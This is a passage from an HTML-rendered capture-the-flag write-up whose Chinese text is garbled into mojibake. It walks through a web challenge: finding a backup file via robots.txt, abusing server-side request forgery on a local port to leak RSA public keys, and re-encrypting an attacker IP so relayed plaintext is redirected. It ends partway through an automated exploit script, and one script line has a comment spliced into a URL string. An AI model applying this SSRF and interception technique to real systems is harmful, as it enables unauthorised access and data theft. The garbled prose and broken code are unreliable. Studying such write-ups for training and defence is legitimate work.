</span></span><span class="line"><span class="cl"><span class="n">private_key1</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">encrypt</span><span class="p">(</span><span class="s1">&#39;Get ctfshow{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} for discover dark web secrets. High quality, low price. Perfect for aspiring hackers!&#39;</span><span class="p">,</span><span class="n">public_key1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è¿è¡Œç»“æœ</span>
</span></span><span class="line"><span class="cl"><span class="mi">512</span>
</span></span><span class="line"><span class="cl"><span class="mi">1024</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<h5 id="4è®¿é—®robotstxt">4.è®¿é—®robots.txt</h5>
<p>å› ä¸ºâ€œç‚¹æˆ‘è¿›å…¥å®‡å®™å•†åŸâ€ é“¾æ¥ï¼Œå›æ˜¾äº†è‡ªå·±çš„IPï¼ŒåŠ å¯†ä¹ŸåŒæ„åˆ©ç”¨äº† IPï¼Œå¯èƒ½IPä¼šæ˜¯çªç ´ç‚¹ï¼ŒæŸ¥çœ‹ robots.txt</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">é¡µé¢å†…å®¹ï¼š
</span></span><span class="line"><span class="cl">user-agent: *
</span></span><span class="line"><span class="cl">Disallow: shop.py.bak
</span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹åˆ°äº†shop.py.bakï¼Œç»§ç»­è®¿é—®ä¸€ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">é¡µé¢å†…å®¹</span><span class="err">ï¼š</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;api&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">api</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;api&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[\d\.:]+$&#39;</span><span class="p">,</span> <span class="n">api</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">get</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://&#39;</span><span class="o">+</span><span class="n">api</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">html</span> <span class="o">+=</span> <span class="s1">&#39;&lt;!--&#39;</span><span class="o">+</span><span class="n">get</span><span class="o">.</span><span class="n">text</span><span class="o">+</span><span class="s1">&#39;--&gt;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">html</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æƒ³åˆ°æœ¬åœ°è®¿é—® 9999 ç«¯å£ /shop?api=127.0.0.1:9999</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Type&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;text/html; charset=utf-8&#34;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">éå¸¸æŠ±æ­‰ï¼Œæœ¬ç½‘ç«™å› è¢«é»‘å®¢æ”»å‡»æ­£åœ¨æŠ¢ä¿®ä¸­...<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">Your IPï¼š2.56.12.89<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">æ‚¨çš„è®¿é—®å·²è®°å…¥æ—¥å¿—ã€‚<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!--ä½ å…ˆå¥½å¥½çœ‹çœ‹è‡ªå·±ç§é’¥å•¥æ ¼å¼ï¼Œåˆ«æ¼äº†&#34;\n&#34;
</span></span></span><span class="line"><span class="cl"><span class="c">&#34;public_key1&#34;: &#34;-----BEGIN PUBLIC KEY-----
</span></span></span><span class="line"><span class="cl"><span class="c">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmz4yT2QVwRhVzGQ0FGm6
</span></span></span><span class="line"><span class="cl"><span class="c">JQWgIxjsVImyeX8a2D61BPLzEBz8Z8RXaNDzmTIzG8itsCptyXcSMhd8bWbKKpdX
</span></span></span><span class="line"><span class="cl"><span class="c">xtwAdmUv85aR07XEEX4h/WgTsZLxZorQls5OUwGbRQ9vtzx79u4/mA5ZJ9cyBsMI
</span></span></span><span class="line"><span class="cl"><span class="c">KLScKf5eH+1nfHqqzlSJXNu+S15obPRVQYAVnXfnygJmq7O33+yYv947e5Gih6ky
</span></span></span><span class="line"><span class="cl"><span class="c">PisXCKWUOAzAYP8qe1yqS4VWxnIgxm1Ozc7BvgJvxhilBIHnligmlEQaSEHxCW07
</span></span></span><span class="line"><span class="cl"><span class="c">ZvJXjTuOyY7VoH5NgmW9c3mv9udvCCFokvB+PCNOej9FUezgUs1sAb4PpAmZLJEU
</span></span></span><span class="line"><span class="cl"><span class="c">JwIDAQAB
</span></span></span><span class="line"><span class="cl"><span class="c">-----END PUBLIC KEY-----&#34;, &#34;
</span></span></span><span class="line"><span class="cl"><span class="c">public_key2&#34;: &#34;-----BEGIN PUBLIC KEY-----
</span></span></span><span class="line"><span class="cl"><span class="c">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2zfAOrCxswYCYSt6hVJW
</span></span></span><span class="line"><span class="cl"><span class="c">69PhbhRmTD4aDXgThqwRE2Ev16S0uIHSuon7CnkyREiu7FIpG0UBPKAdh2NDZba7
</span></span></span><span class="line"><span class="cl"><span class="c">H9UqPgHjHCeikRlQoBUHordJdJDnaQSOf+/u+feKs3IvY+CuHGAP45h57WHovSfb
</span></span></span><span class="line"><span class="cl"><span class="c">5NSHGA1VGO/9Zl6WJVjMwY0dNvtdDLYycezUeWSRUX+YVZhMOjWQ1xoEwFwo+qWv
</span></span></span><span class="line"><span class="cl"><span class="c">3np+lK3m4Po4I4kN4bdvz14ls5jpzkthIOu1lS6QxSURdA3yms3OWWcWhrZdsEok
</span></span></span><span class="line"><span class="cl"><span class="c">c+1eB84+uzohllO8+ZHE8LXLAnhKjANGJWnwKsiaVq+gl49yMyU8S52TyYd9Mq/z
</span></span></span><span class="line"><span class="cl"><span class="c">7wIDAQAB
</span></span></span><span class="line"><span class="cl"><span class="c">-----END PUBLIC KEY-----&#34;, &#34;
</span></span></span><span class="line"><span class="cl"><span class="c">public_key3&#34;: &#34;-----BEGIN PUBLIC KEY-----
</span></span></span><span class="line"><span class="cl"><span class="c">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArJXS3k546UPXPpQ/TVjT
</span></span></span><span class="line"><span class="cl"><span class="c">hX2SUbr+s4ItsRUSUogo558qmdWg8EnjwaOo6Pi6cY2aWb1F2Fhsz17NoMYQ6InW
</span></span></span><span class="line"><span class="cl"><span class="c">lZqSR6k1uwxbPZ/xK929b/q+6paxoacU05Hopor3LFq0Uw1rf7ZLp22BTbHyFVID
</span></span></span><span class="line"><span class="cl"><span class="c">xMe/pTuiB1BxlAQiKQ10W5fcJWuuD1E8kFGj37TtlKtu+hPspgC0z8vNnzyI6Z7k
</span></span></span><span class="line"><span class="cl"><span class="c">1JpttlNsofQ2AZTziglwtVbrSJJB6R5kCVIKFlpDjdVPH8aEqISqXlsIikS7yNAk
</span></span></span><span class="line"><span class="cl"><span class="c">4OZLPO0iA4PhLh5DvbczdJB+wBU3HVr/QRwHf7AmI7c1+PS0DtrBrvVFyk6ZhNTt
</span></span></span><span class="line"><span class="cl"><span class="c">dwIDAQAB
</span></span></span><span class="line"><span class="cl"><span class="c">-----END PUBLIC KEY-----&#34;--&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ³¨é‡Šé‡Œé¢æœ‰ 3 ä¸ªå…¬é’¥ï¼Œå¯ä»¥è‡ªå·±åˆ©ç”¨è„šæœ¬è¿›è¡ŒåŠ å¯†ï¼Œ</p>
<p>é€šè¿‡è¯¥ç½‘ç«™çš„å…¬é’¥ 1 å’Œè‡ªå·±çš„ç§é’¥ 1 è¿›è¡ŒåŠ è§£å¯†ï¼Œå¯è¡Œï¼Œ</p>
<p>è¯´æ˜è¯¥ç½‘ç«™ç”¨æˆ· A å¦‚æœå¯¹è‡ªå·± IP è¿›è¡ŒåŠ å¯†ï¼Œç„¶åæ›¿æ¢â€œè§£å¯†åçš„æ•°æ®â€œä¸­çš„ç”¨æˆ·Bçš„IPï¼Œæœ€ç»ˆæ˜æ–‡ä¼šå‘é€ç»™è‡ªå·±ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">PKCS1_v1_5</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">abort</span>
</span></span><span class="line"><span class="cl"><span class="c1"># åŠ å¯†</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">public_key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"> <span class="n">cipher</span> <span class="o">=</span> <span class="n">PKCS1_v1_5</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">public_key</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"> <span class="n">ciphertext</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">plaintext</span><span class="p">),</span> <span class="mi">128</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"> <span class="n">ciphertext</span> <span class="o">+=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">128</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="n">ciphertext</span>
</span></span><span class="line"><span class="cl"><span class="n">IP</span> <span class="o">=</span> <span class="s1">&#39;2.56.12.89&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">plaintext_half</span> <span class="o">=</span> <span class="s1">&#39;æ‹¦æˆªçš„ è§£å¯†åçš„æ•°æ®&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># å…¬é’¥å¼€å¤´ã€ç»“å°¾æœ‰ä¿©\n</span>
</span></span><span class="line"><span class="cl"><span class="n">public_key2</span> <span class="o">=</span> <span class="s1">&#39;-----BEGIN PUBLIC KEY-----</span><span class="se">\n</span><span class="s1">xxx</span><span class="se">\n</span><span class="s1">-----END PUBLIC KEY--</span>
</span></span><span class="line"><span class="cl"><span class="o">---</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">public_key3</span> <span class="o">=</span> <span class="s1">&#39;-----BEGIN PUBLIC KEY-----</span><span class="se">\n</span><span class="s1">xxx</span><span class="se">\n</span><span class="s1">-----END PUBLIC KEY--</span>
</span></span><span class="line"><span class="cl"><span class="o">---</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">IP_ciphertext</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="n">public_key3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">IP_ciphertext</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">IP_ciphertext</span><span class="p">,</span> <span class="n">public_key2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># æ›¿æ¢æœ€ç»ˆ IP</span>
</span></span><span class="line"><span class="cl"><span class="n">plaintext_half_new</span> <span class="o">=</span> <span class="n">plaintext_half</span><span class="p">[:</span><span class="mi">2048</span><span class="p">]</span> <span class="o">+</span> <span class="n">IP_ciphertext</span> <span class="o">+</span> 
</span></span><span class="line"><span class="cl"><span class="n">plaintext_half</span><span class="p">[</span><span class="mi">4096</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">plaintext_half_new</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å°†æ–°ç”Ÿæˆçš„æ•°æ®æ›¿æ¢â€œè§£å¯†åçš„æ•°æ®â€ï¼Œåˆ©ç”¨postä¼ å‚å‘é€ï¼Œç„¶åè®¿é—®ï¼Œè·å– FLAGï¼Œå› ä¸ºæœ€ç»ˆä¼ é€’çš„ IP æ˜¯è‡ªå·±ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># æ–°ç”Ÿæˆçš„è§£å¯†åæ•°æ®
</span></span><span class="line"><span class="cl">624f40b736d3cc973bb4ff63266fd583418692950b182aa482f4a12fa4898e4fa1f281e1996323a5f3ffa7e7a2a2a410004e7d881a3c706c731b47955a68d9dcb2b27d3dab8ee7edc42aaae68c0897b8a53ede59c2b90addcba162279a68bed2eb0babb30dd4dd765563005fd0146ae950c532742b474b05e62344ce8ab65fddbd9da8f3e5cb9c9087b00dd0e432511b89e4889efc16bc8cfdf75348382a8e0b900292897f90bf92479554b68606f788e4725cf31f67848472652c1b6c2433e17f7d19a5c90e6b7ef1650773f0bd9bb46d0efddbbb6b70234f69711a50fe8b63fd294c236cb0eae075116348de5000c7594a5dcfe207e3a73fd0f5b468f400e4547b054da58f6493f2bf77f72f6160d301f10355da74957a13fbe952cc41442c06b96a302d4ded356e5e48a78c03c67434992a9a5069f5529d1c4400c65be639c75c0aba8571a2b6456d07223df26d0857af6efd9214224b1dc3faca135c7bf628c220b12fed7ac95ad676b7b70ae215f5b33cb9fc93730baf38723aa1aa9163bf93c70e7cc37f9c69d804b0715fa3901c6d9e7022d5635b6108ed7688848f27aa5b6cc7e7e20a2a614c610f4493a5e76b50e7717cf97f1ffa1ee106acdd77e246638f386cb0e1a5d9fd4b249a1d2c9423a90636cfa11d58c171a746554916bae0b3c6fb0a469f5ae9c806febb18946adc15df93b1027e4c52c479c1fa57dfe49d2466f3d2e5e917bed4948423b6109f85d30bd94aa4d4e3c5d271db4c9dad8a5e56b6b536515d4596441bc23439f7e2cc4ea57ddf8afdd49937a4cedd0eda267647fdf73701d4dc96f7ff2d0888699a14f5da7eb421b3ed15dc9f0f151845df566ef40d0220dbb3317a3f5dc755060c63d930224df991bdd2a462affbc46100d8b2734695838bda5f4d8f75132597c291123816d7c158fdb893daa568016fda769c690d14cbff5778faea0b21519473f565c4920f1cffd09646ea858bbd908189d6bfd422a2ba8d27e83d4e99aeabb45983e0d5242ed6c4433f369d93df2b6ef92b69914b1b349f39119634568a55ede90fa36f320192124f5c65e4975919fdc22babae4135d3b9a375db27a6d46ee027fd291fa78d3cbc14ec24b89969c364ce56fbebe8ba68589393ffa55cacfe6e9bef0d711e8cacd4fe3339e2aa76c0652e8634fe0d3b19a22e3d4f0baf79f43071c059ce0f85f03567c90b544d225ee97ee2dba9c356dd8db6fc839f55c66318f5d7ba58c1e62e891866a0dc280403c993f9cfd2eac9a766e221c57449efa94e55b17c3bd922f9d6c1ddd79e7b43b27b239cb4c00be876815009dbd8989c470424a5990d1e17a8cc7438fc2fac69d416203f6cfb8332857205212ad72c17fb0b8b301a040ce840de67a9b28e1a1588420f835860162fe767496f64ce28f683ee83b35a37062c6bd48dd4b90e3628987d370664685a0cdc13bb1fc2e8b17b744f9eca3255dcc3ecd455ec6ea29bbfb6cd726b7398eaf3d17f4aec078d591d39e1f0a16c650fbb24dfc384aa04d0aef7f8904ccb26adb9e14da2802af0f1b44eea1acc835abb48bc05ba7a8640ae251ded329f60ef6e2d90ad040317976ead2936c7c6def1214498fab8dc755b81bb6d88f772e1ed913449610ec12a38f2708ea13098e268a2d87314e72b5c74a9a852b91e8ccc35a9279112ac78619fc558116820eed98e70b8f6d1d4ab34ada83ccddd2e33467b6d29a090d65d393c4f1918f650580f0b4e8ad73601987048aa14f1713116a4baaa8a72edbd9e902f0d4dce0bf33edec29451194f41c6c8c5422001f9aa8929d279b43e878e6ad17cfa8626e89a776a23e2a3ce925b9268b923190e2ba279f67d2355a2f3c98576ea0c6944bfae2a1945607414cd32f7eac0714e70fac763e183ec1b745f68b03a3ca9ccae7649b7977dcbf204b4ced74b6a7b3345f5ec7f39240c3d0e3194c413d7d9f367de93a6681318dbfc28de604c40754319f77d6c2d607daeb7b2b87e39cb6d978b995a33ba4f7414ee53956a953b7271962fd8c76cbce84912ffb005ebea6c77639cdba405e968ef746bd9e3228dc0da52698d79ef6a21c93398306d4a93255be6e8e127db6333ca420bd144ac64c13ddebd940c058e983964c0cbafc4342f007a63e17e299c324fb9751226cc6df6d50ba2a50cb90c7ee41460d002954f86388e60c1b3eddf55f0d12faab142a5f54bbd392b5356df12f06b470eae2ace3655dd99ca7a47cf1ef4afab70d9f8e3751211759ef7ecc3746782ee8c6e8bb6daed77643526b8ee5aae2afa6a6b61179e432dd85262e581247de409d80e3094f5d24cae5bfa03e28f6d886d4a5a537fc6419bf577bdbda4e4c8e8877d60f710f3182ca0649518de119ade1f3364400b742b886ccb9369c839d9a2df82a40eebae502c9f19c936df0a79b68b555fa578af472946b7f820ced3beb74d0e329479ec87e7845c9f13d5474f6f04023860c9d05c21d528ff4d8874a59900e743560aa7926d65b9b1ff83d1a817fdd10aa24f390b02d9c1f745752f87081034be140516217b60433197adaf60f7eda650c08802ff8fc27322dbb72bb19086aef2adb63ba29c0ed913822014a361845aa2fe1cb5a30f9ba1f2a24c01f7dca3099ce12cd15e586a86c8f286339aa4dcf022726fad15639562059ae118744bb81310d9dcba153eed0f918f58077b449be60ee18c9cee868c23c396c9f66b2064bfc7114c4eab207bf2f6536ba0fd05435cb861db39278a8b46dc4673d432592c9c153840c94d3d3ef867d76977065597f700b7e1c70654939769efbc5f263b9d0ad9dd1835945948ed09ab40c6e28c9a089d6a8152a929b7142e0a4eef38518185f7fd4556d40d8a9c16b135c1dd941703a6c9384a88ec2c1835ca1d895be51b2ed1a8f675d6cb88ef9a4a7ae981725a9af09b73603f0c4342119668c79df73d68dc4eb157223d8193e85f9917c1c6f378cdc7b042eb18588faacdea994ec599f138fb74fd53494bf6e5d34a5949be6f750dd87e8a854b25a6969b1021eb3e81d6c74be02d95789bdca6fde4bc29d345d42e3e124981f0ea221e4601e95c72b44a6b078eb9e3fcd098f903617b69cab1110615701965a901d9197563595157bfc17e280b8b1e0edc7d3d424d52e6e55f8d44dff6c1685c349bebb6a976fd29658877ed409584ad2c75e9dda60de23607c32e633bd1f20e60f6dd70a8c1045686b1745d4e212c99e31d08bdc5f45550439357b73d20fdf9e92
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="2payloadä¸€æŠŠæ¢­è„šæœ¬">2.payloadï¼šä¸€æŠŠæ¢­è„šæœ¬</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">PKCS1_v1_5</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">abort</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://2c5da381-d8ac-4d1b-8918-dc3ebde25791.challenge.ctf.show/&#39;</span>  <span class="c1"># é¢˜ç›®URLï¼Œå…ˆç­‰å‡ ç§’å†è¿è¡Œ</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># åŠ å¯†</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">public_key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">PKCS1_v1_5</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">public_key</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ciphertext</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">plaintext</span><span class="p">),</span> <span class="mi">128</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">ciphertext</span> <span class="o">+=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="mi">128</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ciphertext</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_plaintext_half</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/update&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;[^@]*\.92&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_public_key</span><span class="p">(</span><span class="n">public_key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/shop?a # è·å–è§£å¯†åçš„æ•°æ®pi=127.0.0.1:9999&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;-----BEGIN PUBLIC KEY-----</span><span class="se">\n</span><span class="s1">.*</span><span class="se">\n</span><span class="s1">.*</span><span class="se">\n</span><span class="s1">.*</span><span class="se">\n</span><span class="s1">.*</span><span class="se">\n</span><span class="s1">.*</span><span class="se">\n</span><span class="s1">.*</span><span class="se">\n</span><span class="s1">.*</span><span class="se">\n</span><span class="s1">-----END PUBLIC KEY-----&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)[</span>
</span></span><span class="line"><span class="cl">        <span class="n">public_key</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">IP</span> <span class="o">=</span> <span class="s1">&#39;2.56.12.89&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">plaintext_half</span> <span class="o">=</span> <span class="n">get_plaintext_half</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="c1"># è·å–å…¬é’¥2ã€3</span>
